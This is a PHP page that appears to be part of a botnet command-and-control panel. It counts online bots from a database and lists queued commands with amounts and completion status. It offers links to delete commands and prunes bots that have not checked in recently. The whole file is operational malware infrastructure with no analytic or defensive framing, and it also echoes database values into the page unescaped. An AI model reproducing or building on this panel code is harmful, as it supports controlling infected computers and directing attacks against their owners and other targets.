<?php
include_once('config.php');

$result = mysql_query("SELECT * FROM bots");
$num_rows = mysql_num_rows($result);

echo "<h1> $num_rows Online </h1>";
?>
</br>

<?php
$result = mysql_query("SELECT * FROM cmd");
$num_rows = mysql_num_rows($result);

echo "<table border='1'>
<tr>
<th>ID&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</th>
<th>Command&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</th>
<th>&nbsp;&nbsp;&nbsp;&nbsp;Amount&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</th>
<th>Finished&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</th>
</tr>";


while($row = mysql_fetch_array($result))
  {
  echo "<tr>";
  echo "<td>" . $row['id'] . "</td>";
  echo "<td><a href='" . $row['cmd'] . "'>" . $row['cmd'] . "</a></td>";
  echo "<td>&nbsp;&nbsp;&nbsp;&nbsp;" . $row['amount'] . "</td>";
  echo "<td>" . $row['done'] . "</td>";
?>

<form name="input" action="" method="post">
<td><a href="index.php?id=<?php echo $row['id'];?>"><img src="images/x.gif"></a></td>
</form>

<?php
  echo "</tr>";
  }
echo "</table>";

$time = time();
mysql_query("DELETE FROM bots WHERE time < $time - 800");
?>